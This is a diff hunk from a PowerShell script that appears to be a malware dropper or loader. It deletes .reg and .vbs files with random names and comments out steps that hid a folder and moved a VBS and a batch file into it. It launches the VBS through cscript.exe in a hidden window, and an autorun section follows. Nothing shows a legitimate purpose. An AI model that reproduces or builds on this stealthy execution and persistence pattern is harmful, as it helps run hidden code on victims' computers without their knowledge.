@@ -190,17 +190,17 @@ Remove-Item -Path "config.json"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
-mkdir $initial_dir\esSDyVlwHITj
+#mkdir $initial_dir\esSDyVlwHITj
 
-Set-ItemProperty -Path "$initial_dir\esSDyVlwHITj" -Name Attributes -Value "Hidden"
+#Set-ItemProperty -Path "$initial_dir\esSDyVlwHITj" -Name Attributes -Value "Hidden"
 
 #attrib +h "initial_dir\esSDyVlwHITj"
 
-Move-Item -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Destination $initial_dir\esSDyVlwHITj
+#Move-Item -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Destination $initial_dir\esSDyVlwHITj
 
-Move-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Destination $initial_dir\esSDyVlwHITj
+#Move-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Destination $initial_dir\esSDyVlwHITj
 
-Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "$initial_dir\esSDyVlwHITj\ZDaFvwjOosKx.vbs"
+Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "$initial_dir\ZDaFvwjOosKx.vbs"
 
 
 # Start Autorun
